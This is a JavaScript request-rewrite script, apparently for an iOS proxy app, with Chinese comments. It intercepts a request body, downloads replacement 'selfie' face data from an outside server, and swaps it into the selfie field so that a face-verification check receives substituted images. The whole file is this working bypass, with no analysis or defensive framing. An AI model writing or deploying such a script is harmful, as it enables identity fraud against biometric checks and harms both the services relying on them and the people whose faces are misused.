let body = $request.body;
let bodyObj = JSON.parse(body);

// 1. 发送请求以获取新的selfie数据
const getNewSelfie = async () => {
    const url = "https://mpfacetxt.myngn.top/getChipperContent.php";
    const requestBody = JSON.stringify({
        "request_chipper": true
    });

    const response = await fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: requestBody
    });

    const data = await response.json();
    if (data.status === "success" && data.file_content) {
        return data.file_content;
    } else {
        console.error("Failed to fetch new selfie data:", data.message);
        return null;
    }
};

// 2. 替换请求体中的selfie字段
getNewSelfie().then(newSelfie => {
    if (newSelfie) {
        // 如果获取到了新的人脸数据，替换selfie字段
        if (bodyObj.selfie) {
            bodyObj.selfie = newSelfie;
        }

        // 将修改后的JSON对象转回字符串
        body = JSON.stringify(bodyObj);

        // 返回修改后的请求体
        $done({ body });
    } else {
        // 如果没有获取到新人脸数据，保持原始body
        $done({ body });
    }
}).catch(error => {
    console.error("Error occurred while fetching new selfie:", error);
    // 如果发生错误，保持原始body
    $done({ body });
});
